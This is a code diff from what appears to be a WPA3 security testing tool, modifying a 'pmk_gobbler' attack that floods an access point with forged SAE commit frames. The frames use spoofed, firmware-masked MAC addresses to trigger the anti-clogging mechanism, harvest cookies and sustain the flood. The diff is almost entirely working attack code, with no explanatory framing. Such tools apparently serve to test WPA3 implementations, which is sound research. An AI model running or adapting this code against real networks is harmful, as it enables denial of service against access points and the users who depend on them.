@@ -11,6 +11,7 @@
 #include "logger/log.h"
 #include "observer/resource_checker.h"
 #include "system/hw_capabilities.h"
+#include "system/firmware/ath9k_htc.h"
 
 using namespace std;
 using namespace Tins;
@@ -79,8 +80,8 @@ namespace wpa3_tester::pmk_gobbler {
         log(LogLevel::INFO, "Cookie capture stopped");
     }
 
-    ACMCookie trigger_acm(const string &iface,
-                      const HWAddress<6> &ap_mac, const int trigger_count, dos_helpers::SAEPair sae_params) {
+    ACMCookie trigger_acm(const string &iface, const string &att_mac,
+                      const HWAddress<6> &ap_mac, const int trigger_count, const dos_helpers::SAEPair& sae_params) {
         PacketSender sender(iface);
 
         char errbuf[PCAP_ERRBUF_SIZE];
@@ -103,7 +104,7 @@ namespace wpa3_tester::pmk_gobbler {
 
         log(LogLevel::INFO, "Triggering ACM (max %d frames)...", trigger_count);
         for (int i = 0; i < trigger_count; ++i) {
-            auto frame = make_sae_commit(ap_mac, HWAddress<6>(hw_capabilities::rand_mac()), sae_params);
+            auto frame = make_sae_commit(ap_mac, HWAddress<6>(firmware::get_ath_masker_mac(att_mac)), sae_params);
             sender.send(frame);
 
             const auto deadline = steady_clock::now() + milliseconds(5);
@@ -119,7 +120,7 @@ namespace wpa3_tester::pmk_gobbler {
 
                 pcap_pkthdr *header;
                 const uint8_t *packet;
-                while (pcap_next_ex(handle, &header, &packet) == 1) {
+                if (pcap_next_ex(handle, &header, &packet) == 1) {
                     if (auto cookie = parse_acm_response(packet, header->caplen)) {
                         if(cookie->token.empty()) continue;
                         log(LogLevel::INFO, "ACM confirmed active after "+to_string(i + 1) + " frames");
@@ -131,7 +132,7 @@ namespace wpa3_tester::pmk_gobbler {
         throw run_err("ACM not activated after "+to_string(trigger_count) + " frames");
     }
 
-    void burst_with_cookies(const string &iface, const HWAddress<6> &ap_mac,
+    void burst_with_cookies(const string &iface, const string &sta_mac, const HWAddress<6> &ap_mac,
                             CookieStore &store, const int attack_time_sec, const dos_helpers::SAEPair &sae_params) {
         PacketSender sender(iface);
         long long sent     = 0;
@@ -146,6 +147,9 @@ namespace wpa3_tester::pmk_gobbler {
                 lock_guard lock(store.mtx);
                 if (store.queue.empty()) {
                     this_thread::sleep_for(milliseconds(10));
+                    //FIXME mají se doplňovat?
+                    auto frame = make_sae_commit(ap_mac, HWAddress<6>(firmware::get_ath_masker_mac(sta_mac)), sae_params);
+                    sender.send(frame);
                     continue;
                 }
                 const auto it = store.queue.begin();
@@ -199,7 +203,7 @@ namespace wpa3_tester::pmk_gobbler {
         attacker->up_iface();
 
         //  force AP into ACM mode
-        ACMCookie first = trigger_acm(iface, ap_mac, trigger_count, sae_params);
+        ACMCookie first = trigger_acm(iface, attacker["mac"], ap_mac, trigger_count, sae_params);
         rs.start_observers();
         CookieStore store;
         thread capture_thread([&]() {
@@ -212,7 +216,7 @@ namespace wpa3_tester::pmk_gobbler {
         });
 
         try {
-            burst_with_cookies(sniff_iface, ap_mac, store, attack_time, sae_params);
+            burst_with_cookies(sniff_iface, attacker["mac"] , ap_mac, store, attack_time, sae_params);
         } catch (...) {
             store.stop.store(true);
             if (capture_thread.joinable()) capture_thread.join();
